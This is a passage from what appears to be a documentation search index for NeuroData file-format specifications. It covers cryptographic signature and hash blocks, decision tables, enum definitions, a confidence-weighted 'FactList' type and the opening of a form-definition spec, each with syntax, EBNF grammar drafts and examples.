\"EdDSA\"\nTIMESTAMP 2024-04-12T14:30:00Z\nSIGNATURE ```base64\nK7L[...]EXAMPLE[...]9wA=\n</code></pre>     ```</li> </ul>"},{"location":"NeuroData/cryptographic/#44-hash-ndhash","title":"4.4 Hash (<code>.ndhash</code>)","text":"<ul> <li>Purpose: Represents a cryptographic hash of specified content.</li> <li><code>:: type: Hash</code></li> <li>Attributes:<ul> <li><code>CONTENT_REF \"[ref:&lt;location&gt;[#&lt;block_id&gt;]]\"</code>: Reference to the hashed content.</li> <li><code>ALGORITHM \"&lt;hash_alg_name&gt;\"</code>: E.g., \"SHA-256\", \"SHA-512\", \"BLAKE2b-256\".</li> <li><code>HASH_VALUE \"&lt;hex_string&gt;\"</code>: The hash value, typically hex encoded. (Could allow Base64 block too).</li> </ul> </li> <li>Example: <pre><code>:: type: Hash\n:: version: 0.1.0\n\nCONTENT_REF \"[ref:firmware.bin]\"\nALGORITHM \"SHA-256\"\nHASH_VALUE \"e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855\"\n</code></pre></li> </ul>"},{"location":"NeuroData/cryptographic/#5-tooling-requirements","title":"5. Tooling Requirements","text":"<p>Using these formats effectively requires a suite of cryptographic tools within the NeuroScript environment. These tools currently do not exist [cite: uploaded:neuroscript/pkg/core/tools_register.go] and would need to be implemented, potentially wrapping standard Go cryptographic libraries.</p> <p>Potential required tools: * <code>TOOL.GenerateKeyPair(type, size)</code> -&gt; <code>ndid_content</code> * <code>TOOL.CalculateHash(content_ref_or_string, algorithm)</code> -&gt; <code>hash_value_string</code> * <code>TOOL.CreateSignature(content_ref_or_string, private_key_ref, algorithm)</code> -&gt; <code>signature_value_base64</code> * <code>TOOL.VerifySignature(signature_ref, public_key_ref_or_ndid, algorithm)</code> -&gt; <code>bool</code> (Verifies against the content referenced within the <code>.ndsig</code> file/block). * <code>TOOL.ParseCertificate(cert_ref_or_content)</code> -&gt; <code>map</code> (Extracts fields from a certificate). * <code>TOOL.ValidateCertificate(cert_ref, trusted_roots_ref)</code> -&gt; <code>bool</code> (Checks validity period, signature, potentially chain). * <code>TOOL.GetPublicKeyFromCert(cert_ref_or_content)</code> -&gt; <code>ndid_content</code> (Extracts public key from cert). * <code>TOOL.EncodeData(data, format)</code> -&gt; <code>string</code> (e.g., format=\"base64\", \"hex\", \"pem\") * <code>TOOL.DecodeData(encoded_string, format)</code> -&gt; <code>data</code></p> <p>Implementing these tools securely requires careful handling of keys and cryptographic primitives.</p>"},{"location":"NeuroData/decision_table/","title":"NeuroData Decision Table Format (.nddt) Specification","text":"<p>:: type: DecisionTableFormatSpec :: version: 0.1.0 :: status: draft :: dependsOn: docs/metadata.md, docs/references.md, docs/neurodata/table.md, docs/neurodata_and_composite_file_spec.md :: howToUpdate: Refine condition/action syntax, cell value representations (ranges, wildcards), hit policy definitions, EBNF, examples.</p>"},{"location":"NeuroData/decision_table/#1-purpose","title":"1. Purpose","text":"<p>NeuroData Decision Tables (<code>.nddt</code>) provide a structured, human-readable format for representing business rules and decision logic. They map combinations of input Conditions to determined Actions or Outcomes. This format aims to make complex conditional logic explicit, inspectable, and manageable, separating it from procedural NeuroScript code.</p> <p>While potentially inspired by logic programming concepts like Prolog, the <code>.nddt</code> format focuses on a tabular representation for readability and tool-based evaluation, rather than direct execution as Prolog clauses.</p>"},{"location":"NeuroData/decision_table/#2-relation-to-table-format-ndtable","title":"2. Relation to Table Format (<code>.ndtable</code>)","text":"<p>The <code>.nddt</code> syntax borrows heavily from the <code>.ndtable</code> format for its structure (metadata, schema definition, delimited rows). However, its semantics are different: * <code>.ndtable</code> stores rows of data records. * <code>.nddt</code> stores rows of rules, where columns represent logical conditions or resulting actions/outcomes. * Tooling interaction is distinct: <code>.ndtable</code> supports CRUD operations, while <code>.nddt</code> is primarily used for evaluation via a dedicated tool (e.g., <code>TOOL.EvaluateDecisionTable</code>).</p> <p>Therefore, <code>.nddt</code> uses its own <code>:: type: DecisionTable</code> metadata.</p>"},{"location":"NeuroData/decision_table/#3-syntax-nddt","title":"3. Syntax (<code>.nddt</code>)","text":"<p>An <code>.nddt</code> file or block consists of the following sections in order: 1.  File/Block-Level Metadata: Optional <code>:: key: value</code> lines [cite: uploaded:neuroscript/docs/metadata.md]. 2.  Schema Definition: <code>CONDITION</code> and <code>ACTION</code>/<code>OUTCOME</code> definition lines specifying the table's columns. 3.  Rules Separator: A line containing exactly <code>--- RULES ---</code>. 4.  Rule Rows: Lines representing the decision rules, with cells delimited by pipe (<code>|</code>).</p> <p>Comments (<code>#</code> or <code>--</code>) and blank lines are allowed before the schema and between schema lines.</p>"},{"location":"NeuroData/decision_table/#31-fileblock-level-metadata","title":"3.1 File/Block-Level Metadata","text":"<p>Standard <code>:: key: value</code> lines. Recommended metadata includes: * <code>:: type: DecisionTable</code> (Required) * <code>:: version: &lt;semver&gt;</code> (Required) * <code>:: id: &lt;unique_table_id&gt;</code> (Required if referenced) * <code>:: description: &lt;text&gt;</code> (Optional) * <code>:: hitPolicy: &lt;policy&gt;</code> (Optional, default: <code>unique</code> or <code>first</code> - TBD). Defines how multiple matching rules are handled. Common policies (from DMN standard):     * <code>unique</code>: Only one rule can match. Error if multiple match. (Default?)     * <code>first</code>: The first matching rule in document order is selected.     * <code>any</code>: Multiple rules can match, but must all produce the same output. Error if outputs differ.     * <code>collect</code>: All matching rules fire. Outputs are collected (e.g., into a list). Requires defining aggregation for actions if needed (e.g., <code>collect sum</code>, <code>collect list</code>). (Consider deferring complex collect policies).</p>"},{"location":"NeuroData/decision_table/#32-schema-definition-section","title":"3.2 Schema Definition Section","text":"<p>Defines the input conditions and output actions/outcomes as columns. * Condition Definition: <code>CONDITION condition_id data_type [label: \"&lt;text&gt;\"] [validation_rules...]</code>     * <code>CONDITION</code>: Keyword.     * <code>condition_id</code>: Unique identifier (<code>[a-zA-Z_][a-zA-Z0-9_]*</code>) for this condition column. Used to map input data during evaluation.     * <code>data_type</code>: Expected type for matching input data (<code>string</code>, <code>int</code>, <code>float</code>, <code>bool</code>, <code>timestamp</code>, <code>enum(...)</code>).     * <code>[label: \"&lt;text&gt;\"]</code>: Optional human-readable description.     * <code>[validation_rules...]</code>: Optional rules (e.g., <code>REGEX</code>, <code>MIN</code>, <code>MAX</code>) applied to input data before matching, if needed. * Action/Outcome Definition: <code>ACTION action_id data_type [label: \"&lt;text&gt;\"]</code> or <code>OUTCOME action_id data_type [label: \"&lt;text&gt;\"]</code>     * <code>ACTION</code> / <code>OUTCOME</code>: Keywords. (Use one consistently, e.g., <code>ACTION</code>).     * <code>action_id</code>: Unique identifier for this output column.     * <code>data_type</code>: Type of the output value defined in the rule rows (<code>string</code>, <code>int</code>, <code>float</code>, <code>bool</code>, <code>timestamp</code>, <code>enum(...)</code>).     * <code>[label: \"&lt;text&gt;\"]</code>: Optional human-readable description.</p>"},{"location":"NeuroData/decision_table/#33-rules-separator","title":"3.3 Rules Separator","text":"<p>A single line containing exactly <code>--- RULES ---</code> MUST follow the schema definition.</p>"},{"location":"NeuroData/decision_table/#34-rule-rows-section","title":"3.4 Rule Rows Section","text":"<ul> <li>Each line after the separator represents one rule.</li> <li>Columns are separated by the pipe character (<code>|</code>), corresponding to the <code>CONDITION</code> and <code>ACTION</code> definitions in order.</li> <li>Condition Cells: Contain the specific criteria for the rule to match.<ul> <li>Literals: Exact values (<code>\"Gold\"</code>, <code>10</code>, <code>true</code>). Must match the <code>CONDITION</code> data type.</li> <li>Wildcard: A hyphen (<code>-</code>) indicates this condition is irrelevant (\"don't care\") for this rule.</li> <li>Ranges/Expressions (Optional - Requires Tool Support): Simple expressions like <code>\"&gt;10\"</code>, <code>\"[18-65]\"</code>, <code>\"!=\\\"Pending\\\"\"</code> could be supported by the evaluation tool. Define syntax clearly if added.</li> </ul> </li> <li>Action/Outcome Cells: Contain the literal output values assigned if the rule matches. Must match the <code>ACTION</code> data type.</li> <li>Escaping: Use <code>\\|</code> for literal pipe, <code>\\\\</code> for literal backslash within cells, as defined for <code>.ndtable</code>.</li> <li>Rule Metadata (Optional): Comments or <code>:: ruleId: &lt;id&gt;</code> can appear after the last cell on a rule line.</li> </ul>"},{"location":"NeuroData/decision_table/#4-ebnf-grammar-draft","title":"4. EBNF Grammar (Draft)","text":"<pre><code>decision_table_file ::= { metadata_line | comment_line | blank_line }\n                        schema_section\n                        rules_separator newline\n                        rules_section ;\n\nmetadata_line       ::= optional_whitespace \"::\" whitespace key \":\" value newline ;\nschema_section        ::= { schema_line | comment_line | blank_line } ;\nschema_line         ::= condition_definition | action_definition ;\ncondition_definition ::= optional_whitespace \"CONDITION\" whitespace identifier whitespace data_type { whitespace property_block } newline ; (* property_block for label? *)\naction_definition   ::= optional_whitespace (\"ACTION\"|\"OUTCOME\") whitespace identifier whitespace data_type { whitespace property_block } newline ;\n\nrules_separator     ::= optional_whitespace \"--- RULES ---\" optional_whitespace ;\nrules_section       ::= { rule_row | comment_line | blank_line } ;\nrule_row            ::= rule_cell { optional_whitespace \"|\" optional_whitespace rule_cell } [ optional_whitespace rule_metadata ] newline ;\nrule_cell           ::= cell_content ; (* Represents condition entry or action entry *)\ncell_content        ::= { character_except_pipe_or_newline | escaped_pipe | escaped_backslash } | \"-\" ; (* Allow wildcard, ranges need spec *)\nrule_metadata       ::= comment_line | metadata_line ; (* Allow rule IDs? *)\n\n(* Define: identifier, key, value, data_type, property_block, validation_rule, whitespace, newline, comment_line, blank_line, etc. *)\n</code></pre>"},{"location":"NeuroData/decision_table/#5-tool-interaction","title":"5. Tool Interaction","text":"<p>The primary interaction is via an evaluation tool: * <code>TOOL.EvaluateDecisionTable(table_ref_or_content, input_data_map)</code>     * <code>table_ref_or_content</code> (String or Reference): The <code>.nddt</code> definition.     * <code>input_data_map</code> (Map): A map where keys match <code>CONDITION</code> IDs and values are the inputs to check (e.g., <code>{\"customer_type\": \"Gold\", \"order_total\": 1200.50}</code>).     * Behavior:         1. Parses the schema and rules.         2. Iterates through rules, comparing <code>input_data_map</code> values against the corresponding <code>CONDITION</code> cells (respecting type, wildcards, potentially ranges).         3. Applies the <code>:: hitPolicy</code>.         4. Collects the values from the <code>ACTION</code> cells of the winning rule(s).     * Returns: (Map) A map where keys match <code>ACTION</code> IDs and values are the results from the selected rule(s) (or an error string/map if evaluation fails or hit policy violated). For <code>collect</code> policies, values might be lists.</p>"},{"location":"NeuroData/decision_table/#6-example","title":"6. Example","text":"<pre><code>:: type: DecisionTable\n:: version: 0.1.0\n:: id: discount-rules-example\n:: hitPolicy: first # First matching rule wins\n\n# Conditions - Input data expected like {\"cust_type\": \"Gold\", \"total\": 1500}\nCONDITION cust_type  string  [label: \"Customer Type\"]\nCONDITION total      float   [label: \"Order Total\"]\n\n# Actions - Output map will be like {\"discount\": 15, \"needs_approval\": true}\nACTION discount         int     [label: \"Discount %\"]\nACTION needs_approval   bool    [label: \"Requires Approval\"]\n\n--- RULES ---\n# Cust Type | Total | Discount | Approval | :: Rule Info\n\"Gold\"     | &gt;1000 | 15       | true     | :: rule_gold_high\n\"Gold\"     | -     | 10       | false    | :: rule_gold_any\n\"Silver\"   | &gt;500  | 7        | false    | :: rule_silver_med\n\"Silver\"   | &lt;=500 | 5        | false    | :: rule_silver_low\n-          | &gt;2000 | 5        | true     | :: rule_any_very_high\n-          | -     | 0        | false    | :: rule_default_catchall\n</code></pre>"},{"location":"NeuroData/enum/","title":"Enum","text":"<p>:: type: NeuroData :: subtype: spec :: version: 0.1.0 :: id: ndenum-spec-v0.1 :: status: draft :: dependsOn: docs/metadata.md, docs/neurodata_and_composite_file_spec.md, docs/NeuroData/map_schema.md :: howToUpdate: Review attributes, examples, EBNF. Ensure consistency with map_schema enum usage.</p>"},{"location":"NeuroData/enum/#neurodata-enum-definition-format-ndenum-specification","title":"NeuroData Enum Definition Format (.ndenum) Specification","text":""},{"location":"NeuroData/enum/#1-purpose","title":"1. Purpose","text":"<p>NeuroData Enum Definitions (<code>.ndenum</code>) provide a standalone, reusable format for defining named enumerated types (controlled vocabularies). Each member (value) of the enumeration can have optional associated metadata, including a human-readable label, a description, a numeric value, and an attached block for arbitrary structured data. This allows for consistent use of controlled values across different NeuroData files (like <code>.ndtable</code>, <code>.ndform</code>, <code>.ndmap_schema</code>) and NeuroScript procedures.</p>"},{"location":"NeuroData/enum/#2-example","title":"2. Example","text":"<pre><code>:: type: EnumDefinition\n:: version: 0.1.0\n:: id: task-status-enum\n:: description: Defines standard statuses for tasks in the system.\n\n# Enum Values Defined Below\n\nVALUE \"pending\"\n  LABEL \"Pending\"\n  DESC \"Task has been created but not yet started.\"\n  NUMERIC 1\n  DATA ```json\n  {\n    \"ui_color\": \"orange\",\n    \"is_active\": false\n  }\n  ```\n\nVALUE \"in-progress\"\n  LABEL \"In Progress\"\n  DESC \"Task is actively being worked on.\"\n  NUMERIC 2\n  DATA ```json\n  {\n    \"ui_color\": \"blue\",\n    \"is_active\": true\n  }\n  ```\n\nVALUE \"completed\"\n  LABEL \"Completed\"\n  DESC \"Task finished successfully.\"\n  NUMERIC 3\n  DATA ```json\n  {\n    \"ui_color\": \"green\",\n    \"is_active\": false\n  }\n  ```\n\nVALUE \"blocked\"\n  # LABEL defaults to \"blocked\" if omitted\n  DESC \"Task cannot proceed due to an issue.\"\n  # NUMERIC is optional\n\nVALUE \"archived\"\n  LABEL \"Archived\"\n  DESC \"Task is closed and hidden from active views.\"\n  NUMERIC -1\n  # No DATA block needed here\n</code></pre>"},{"location":"NeuroData/enum/#3-design-choices-rationale","title":"3. Design Choices / Rationale","text":"<ul> <li>Consistency: The syntax (<code>VALUE</code>, indented attributes) mirrors the <code>DEFINE ENUM</code> block used within the <code>.ndmap_schema</code> format. This promotes consistency and leverages existing parsing patterns.</li> <li>Readability: Keyword-driven attributes (<code>LABEL</code>, <code>DESC</code>, <code>NUMERIC</code>) enhance human readability.</li> <li>Flexibility: Optional attributes and the optional attached <code>DATA</code> block allow for simple or rich enum definitions as needed.</li> <li>Reusability: Standalone files allow enums to be defined once and referenced from multiple other NeuroData files or scripts using standard <code>[ref:&lt;id&gt;]</code> syntax.</li> </ul>"},{"location":"NeuroData/enum/#4-syntax-format-definition","title":"4. Syntax / Format Definition","text":"<p>An <code>.ndenum</code> file consists of: 1.  Optional file-level metadata lines (<code>:: key: value</code>). 2.  Optional comments (<code>#</code> or <code>--</code>) and blank lines. 3.  One or more <code>VALUE</code> definition blocks.</p>"},{"location":"NeuroData/enum/#41-file-level-metadata","title":"4.1 File-Level Metadata","text":"<p>Standard <code>:: key: value</code> lines at the beginning of the file. Recommended metadata includes: * <code>:: type: EnumDefinition</code> (Required) * <code>:: version: &lt;semver&gt;</code> (Required, version of this enum definition content) * <code>:: id: &lt;unique_enum_id&gt;</code> (Required if this enum will be referenced from elsewhere) * <code>:: description: &lt;text&gt;</code> (Optional)</p>"},{"location":"NeuroData/enum/#42-enum-member-definition-value","title":"4.2 Enum Member Definition (<code>VALUE</code>)","text":"<p>Each member of the enumeration is defined by a block starting with <code>VALUE</code>.</p> <ul> <li>Format:     <pre><code>VALUE \"&lt;keyword_string&gt;\"\n  # Optional indented attribute lines\n  [LABEL \"&lt;display_text&gt;\"]\n  [DESC \"&lt;description_text&gt;\"]\n  [NUMERIC &lt;number_literal&gt;]\n# Optional attached data block\n[DATA ```&lt;format_tag&gt;\n... data content ...\n```]\n</code></pre></li> <li><code>VALUE \"&lt;keyword_string&gt;\"</code>: Starts the definition. The <code>&lt;keyword_string&gt;</code> is the required, unique identifier for this enum member within the file (e.g., <code>\"pending\"</code>, <code>\"active\"</code>). It must be a valid string literal.</li> <li>Indentation: Attribute lines (<code>LABEL</code>, <code>DESC</code>, <code>NUMERIC</code>) and the <code>DATA</code> block fence MUST be indented relative to the <code>VALUE</code> line. Consistent indentation (e.g., 2 or 4 spaces) is recommended.</li> </ul>"},{"location":"NeuroData/enum/#43-optional-attributes","title":"4.3 Optional Attributes","text":"<p>These attributes are defined on lines indented relative to the <code>VALUE</code> line:</p> <ul> <li><code>LABEL \"&lt;display_text&gt;\"</code>: (Optional) A string literal providing a human-friendly label for the enum member. If omitted, tools should default to using the <code>&lt;keyword_string&gt;</code> from the <code>VALUE</code> line.</li> <li><code>DESC \"&lt;description_text&gt;\"</code>: (Optional) A string literal providing a detailed description of the enum member's meaning or usage.</li> <li><code>NUMERIC &lt;number_literal&gt;</code>: (Optional) Associates a numeric value (integer or float) with the enum member. The <code>&lt;number_literal&gt;</code> should be a valid NeuroScript number (e.g., <code>1</code>, <code>-10</code>, <code>3.14</code>).</li> </ul>"},{"location":"NeuroData/enum/#44-attached-data-block-data","title":"4.4 Attached Data Block (<code>DATA</code>)","text":"<ul> <li>(Optional) Immediately following the <code>VALUE</code> line and its indented attribute lines, an optional standard fenced data block can be attached using the <code>DATA</code> keyword on the line before the opening fence.</li> <li>Format:     <pre><code>VALUE \"...\"\n  ... attributes ...\nDATA ```&lt;format_tag&gt;\n{ \"structured\": \"data\", \"value\": 123 }\n</code></pre>     ```</li> <li>The <code>&lt;format_tag&gt;</code> (e.g., <code>json</code>, <code>yaml</code>) indicates the format of the content within the block.</li> <li>This block allows associating arbitrary structured data with an enum member.</li> </ul>"},{"location":"NeuroData/enum/#5-ebnf-grammar-draft","title":"5. EBNF Grammar (Draft)","text":"<p><pre><code>enum_file         ::= { metadata_line | comment_line | blank_line } { value_definition_block } ;\n\nmetadata_line     ::= optional_whitespace \"::\" whitespace key \":\" value newline ; (* As per metadata spec *)\n\nvalue_definition_block ::= value_line { attribute_line } [ data_block ] ;\n\nvalue_line        ::= optional_whitespace \"VALUE\" whitespace string_literal newline ;\n\nattribute_line    ::= indentation (\"LABEL\"|\"DESC\"|\"NUMERIC\") whitespace attribute_value newline ;\nindentation       ::= whitespace+ ;\nattribute_value   ::= string_literal | number_literal ; (* Value type depends on keyword *)\n\ndata_block        ::= indentation \"DATA\" whitespace fenced_block ;\nfenced_block      ::= \"```\" [ language_tag ] newline { text_line } optional_whitespace \"```\" newline ;\n\n(* Define: string_literal, number_literal, key, value, whitespace, newline, comment_line, blank_line, language_tag, text_line, optional_whitespace *)\n</code></pre> (Note: This EBNF needs refinement, especially regarding indentation parsing)</p>"},{"location":"NeuroData/enum/#6-tooling-requirements-interaction","title":"6. Tooling Requirements / Interaction","text":"<ul> <li>Parsing: Tools need to parse the file structure, recognizing <code>VALUE</code> blocks and their indented attributes (<code>LABEL</code>, <code>DESC</code>, <code>NUMERIC</code>). They must also handle the optional attached <code>DATA</code> block, potentially parsing its content based on the format tag (e.g., using a JSON parser if ```json).</li> <li>Validation: Tools consuming <code>.ndenum</code> references (e.g., in <code>.ndtable</code> or <code>.ndform</code> schemas) should validate that provided values match one of the defined <code>&lt;keyword_string&gt;</code> values in the referenced <code>.ndenum</code> file.</li> <li>Lookup: Tools might provide functions to look up associated data (label, description, numeric value, data block content) based on a given keyword string.</li> <li>UI Generation: The <code>LABEL</code> and <code>DESC</code> attributes can be used by tools to generate more user-friendly interfaces (e.g., dropdown lists with descriptions in forms).</li> <li>Formatting (<code>TOOL.fmt</code>): A formatter should ensure consistent indentation and spacing.</li> </ul>"},{"location":"NeuroData/facts_list/","title":"Fact List","text":""},{"location":"NeuroData/facts_list/#a-new-simple-data-type","title":"A new simple data type","text":""},{"location":"NeuroData/facts_list/#factlist-a-confidence-weighted-checklist-for-neurodata","title":"\u201cFactList\u201d \u2014 a confidence-weighted checklist for NeuroData","text":""},{"location":"NeuroData/facts_list/#1-what-problem-does-it-solve","title":"1. What problem does it solve?","text":"Current pain FactList benefit Checklists are binary. Either a box is ticked or it isn\u2019t. Adds graded certainty (<code>0 \u2026 1</code>) so downstream agents can weigh evidence instead of treating everything as true/false. Free-form metadata gets buried. Facts written in comments or JSON blobs aren\u2019t machine-mergeable. Uniform container with first-class ops: merge, filter, rank, aggregate. Worth-of-work heuristics are ad hoc. A FactList attached to a work product acts as a reproducible quality filter (e.g. \u201c\u226590 % cumulative confidence across core-facts\u201d)."},{"location":"NeuroData/facts_list/#2-core-data-model","title":"2. Core data model","text":"<pre><code>type Fact struct {\n    Text       string    // single declarative sentence\n    Confidence float64   // 0.0\u20131.0\n    Source     SourceRef // optional: URL, file, tool run\n    Stamp      int64     // unix ns for decay / provenance\n}\n\ntype FactList []Fact\n</code></pre> <p>Invariant: <code>Text</code> must be sentence-like (starts with capital, ends with <code>.</code>) to encourage concise assertions.</p>"},{"location":"NeuroData/facts_list/#3-built-in-operations-mvp","title":"3. Built-in operations (MVP)","text":"API Purpose <code>Add(f Fact)</code> Append or up-rev identical <code>Text</code> with higher confidence. <code>Merge(other FactList, mode string)</code> <code>\"max\"</code>, <code>\"avg\"</code>, <code>\"bayes\"</code> fusion of confidences. <code>Filter(fn func(Fact) bool)</code> Predicate filter; cheap for pipelines. <code>Score(require []string) (covered float64, missing []string)</code> Supply must-have fact IDs; returns coverage metric. <code>TopN(n int)</code> Grab highest confidence facts for summaries. <p>Extend <code>typeof</code> in NeuroScript to return <code>\"factlist\"</code>.</p>"},{"location":"NeuroData/facts_list/#4-integration-points","title":"4. Integration points","text":"<ol> <li>New <code>core.Value</code> kind Registration:</li> </ol> <pre><code>core.RegisterKind(core.KindFactList, wrapFactList, unwrapFactList)\n</code></pre> <ol> <li>Interpreter syntax sugar</li> </ol> <pre><code>factlist baseline := [\n  \"All functions have unit tests.\" @0.9,\n  \"Code compiles under Go 1.23.\"   @1.0,\n  \"Benchmarks meet SLA.\"          @0.6\n]\n\nbaseline.add(\"Security scan passes.\" @0.8)\n</code></pre> <p><code>@\"confidence\"</code> postfix keeps authoring friction low.</p> <ol> <li>Check-like evaluation</li> </ol> <pre><code>set covered, missing = baseline.score(require core_facts)\nif covered &lt; 0.9\n  fail \"Insufficient confidence (\" + covered + \")\"\nendif\n</code></pre> <ol> <li>Neuromorphic overlay hook    Reward signal could boost edges between facts that co-occur in successful builds \u2192 better suggestion of missing facts.</li> </ol>"},{"location":"NeuroData/facts_list/#5-persistence-indexing","title":"5. Persistence &amp; indexing","text":"<ul> <li>Use columnar key-value: <code>(FactHash \u2192 confidence, source, stamp)</code>; lists store only hashes to minimise duplication.</li> <li>Secondary index on <code>(Text trigram)</code> for quick dedup/null matching.</li> <li>Snapshot every N ops; actor model from previous discussion slots straight in.</li> </ul>"},{"location":"NeuroData/facts_list/#6-failure-modes-guards","title":"6. Failure modes &amp; guards","text":"Risk Mitigation Confidence inflation (\u201cLake Wobegon\u201d effect). Calibration pass in CI: if manual review disproves a fact, halve confidence of similar facts (Levenshtein \u2264 5). Free-text vagueness. CI linter: must match regex <code>^[A-Z][^.]+[.]$</code>; flag weasel words (<code>may</code>, <code>possibly</code>). Fact explosion. Soft cap per artifact (e.g. 100); auto-merge duplicates by semantic hash (<code>text + stem</code>)."},{"location":"NeuroData/facts_list/#7-worth-of-work-metric-exemplar","title":"7. Worth-of-work metric exemplar","text":"<pre><code>func Worth(needs facts FactList, weights map[string]float) returns score means\n  set covered, _ = facts.score(require weights.keys())\n  set score = 0\n  for each f in facts\n    if f.text in weights\n      set score += weights[f.text] * f.confidence\n    endif\n  endfor\n  return score * covered              # emphasise completeness\nendfunc\n</code></pre> <p>Attach this to CI; gate merges on <code>score &gt;= 0.85</code>.</p>"},{"location":"NeuroData/facts_list/#verdict","title":"Verdict","text":"<p>Low lift\u2014a single new <code>ValueKind</code>, a handful of ops. High leverage\u2014turns subjective \u201clooks good\u201d into a quantifiable, mergeable artifact. Prototype inside <code>neurodata/facts</code> with 3\u20134 critical ops; wire it into your existing checklist flows to validate UX before deeper overlay ties.</p>"},{"location":"NeuroData/form/","title":"NeuroData Form Format (.ndform) Specification","text":"<p>:: type: FormFormatSpec :: version: 0.1.0 :: status: draft :: dependsOn: docs/metadata.md, docs/references.md, docs/neurodata/table.md, docs/neurodata_and_composite_file_spec.md, pkg/neurodata/blocks/blocks_extractor.go :: howToUpdate: Refine field attributes, types, validation rules, EBNF, NS fragment scope/allowlist, examples. Define .ndobj format.</p>"},{"location":"NeuroData/form/#1-purpose","title":"1. Purpose","text":"<p>NeuroData Forms (<code>.ndform</code>) define the structure, presentation, validation rules, and associated metadata for a data entry form. They act as a schema or template for data capture. The <code>.ndform</code> file itself does not contain the filled-in instance data, but rather describes the fields and their properties. It aims to be human-readable while providing enough structure for tools and AI to render, validate, and process form instances.</p>"},{"location":"NeuroData/form/#2-relation-to-form-data-ndobj","title":"2. Relation to Form Data (<code>.ndobj</code>)","text":"<p>The <code>.ndform</code> file defines the schema of the form. The actual data entered into an instance of the form should be stored separately, potentially using a simple key-value format designated <code>.ndobj</code> (NeuroData Object).</p> <p>An <code>.ndobj</code> instance should reference the <code>.ndform</code> it corresponds to via metadata (e.g., <code>:: formRef: [ref:path/to/form.ndform#form-id]</code>).</p> <p>It is expected that <code>.ndform</code> definitions and <code>.ndobj</code> data instances will often be bundled together within composite documents (e.g., Markdown files), identifiable via <code>:: type: Form</code> and <code>:: type: Object</code> (or similar) metadata and extracted using block processing tools [cite: uploaded:neuroscript/pkg/neurodata/blocks/blocks_extractor.go].</p>"},{"location":"NeuroData/form/#3-syntax-ndform","title":"3. Syntax (<code>.ndform</code>)","text":"<p>An <code>.ndform</code> file or block consists of: 1.  File/Block-Level Metadata: Optional <code>:: key: value</code> lines [cite: uploaded:neuroscript/docs/metadata.md]. 2.  Field Definitions: A series of field definitions describing the form structure. 3.  Comments/Blank Lines: Allowed between metadata and fields, and between fields.</p>"},{"location":"NeuroData/form/#31-fileblock-level-metadata","title":"3.1 File/Block-Level Metadata","text":"<p>Standard <code>:: key: value</code> lines. Recommended metadata includes: * <code>:: type: Form</code> (Required) * <code>:: version: &lt;semver&gt;</code> (Required) * <code>:: id: &lt;unique_form_id&gt;</code> (Required if referenced) * <code>:: title: \"&lt;Form Title&gt;\"</code> (Optional, human-readable title) * <code>:: description: &lt;text&gt;</code> (Optional)</p>"},{"location":"NeuroData/form/#32-field-definition","title":"3.2 Field Definition","text":"<p>Each field is defined using a <code>FIELD</code> line followed by indented attribute lines: * <code>FIELD &lt;field_id&gt;</code>: Starts the definition. <code>&lt;field_id&gt;</code> must be a unique identifier within the form (<code>[a-zA-Z_][a-zA-Z0-9_]*</code>). * Attribute Lines (Indentation optional but recommended for readability): Define properties using keywords followed by their value. Common attributes include:     * <code>LABEL \"&lt;text&gt;\"</code>: The human-readable label or question for the field.     * <code>TYPE &lt;type_spec&gt;</code>: Data type. Supported types: <code>string</code>, <code>text</code> (multi-line string), <code>int</code>, <code>float</code>, <code>bool</code>, <code>timestamp</code>, <code>email</code>, <code>url</code>, <code>block_ref</code>, <code>enum(\"val1\", \"val2\")</code>.     * <code>VALUE &lt;literal | template_var | block&gt;</code>: The default or current value. For multi-line text, use a nested fenced block (see 3.3). May contain template variables (<code>{{...}}</code>) if the form is processed by a templating engine.     * <code>HELP &lt;text | block&gt;</code>: Explanatory text for the user. For multi-line help, use a nested fenced block (see 3.3).     * <code>VALIDATION &lt;rules...&gt;</code>: Space-separated standard validation rules (see Section 3.4).     * <code>DEFAULT &lt;value&gt;</code>: Default value (static literal or <code>NOW</code> for timestamp).     * <code>READONLY &lt;true|false&gt;</code>: Indicates if the field value can be edited.     * <code>VISIBLE &lt;true|false&gt;</code>: Indicates if the field should be initially visible.     * (Future attributes for NS fragments: <code>VALIDATE_NS</code>, <code>DEFAULT_NS</code>, <code>CALCULATE_NS</code>, <code>READONLY_NS</code>, <code>VISIBLE_NS</code> - see Section 4). * Attached Blocks: A standard fenced block (<code>```...```</code>) placed immediately after all attribute lines for a <code>FIELD</code> is considered attached to that field (e.g., for complex properties via <code>TYPE: block_ref</code> or just providing context).</p>"},{"location":"NeuroData/form/#33-multi-line-values-value-help","title":"3.3 Multi-line Values (VALUE, HELP)","text":"<p>To define multi-line text for <code>VALUE</code> or <code>HELP</code> attributes, use a nested fenced block immediately following the attribute line: <pre><code>FIELD notes\n  LABEL \"Additional Notes\"\n  TYPE text\n  VALUE ```text\nLine 1 of the value.\nLine 2 of the value.\n</code></pre>   HELP ```markdown Please provide any relevant details. * Use bullet points if needed. * Markdown is supported here. <pre><code>\n</code></pre></p>"},{"location":"NeuroData/form/#34-standard-validation-rules","title":"3.4 Standard Validation Rules","text":"<p>Similar to <code>.ndtable</code>: * <code>NOT NULL</code>: Field must have a non-empty value. * <code>UNIQUE</code>: (Context-dependent) Value should be unique relative to other instances processed together. * <code>REGEX(\"pattern\")</code>: String value must match the Go regex pattern. * <code>MIN(value)</code> / <code>MAX(value)</code>: For numeric/timestamp types.</p>"},{"location":"NeuroData/form/#4-neuroscript-fragment-integration-future-v010","title":"4. NeuroScript Fragment Integration (Future v0.1.0+)","text":"<p>(Note: The following attributes are planned features and not part of the v0.1.0 specification.)</p> <p>Future versions may allow embedding restricted NeuroScript expressions for dynamic behavior: * <code>VALIDATE_NS \"&lt;expression&gt;\"</code>: Expression must evaluate to true for the field value (using <code>{{value}}</code>) to be valid. * <code>DEFAULT_NS \"&lt;expression&gt;\"</code>: Expression result provides the default value. * <code>CALCULATE_NS \"&lt;expression&gt;\"</code>: Field value is dynamically calculated (e.g., <code>CALCULATE_NS(\"'{{row.first}}'+' '+'{{row.last}}'\"</code>). * <code>READONLY_NS \"&lt;expression&gt;\"</code>: Field is readonly if the expression evaluates to true. * <code>VISIBLE_NS \"&lt;expression&gt;\"</code>: Field is visible if the expression evaluates to true.</p> <p>Execution Context: These NS fragments would execute in a highly restricted sandbox: * Scope: Access only to the current form instance data (e.g., via <code>data.field_id</code> or <code>row.field_id</code> for calculated fields) and the specific field's value (<code>value</code>). No access to global interpreter state or <code>LAST</code>. * Allowlist: A minimal allowlist of safe, pure functions/operators (basic math, string manipulation, boolean logic). No I/O 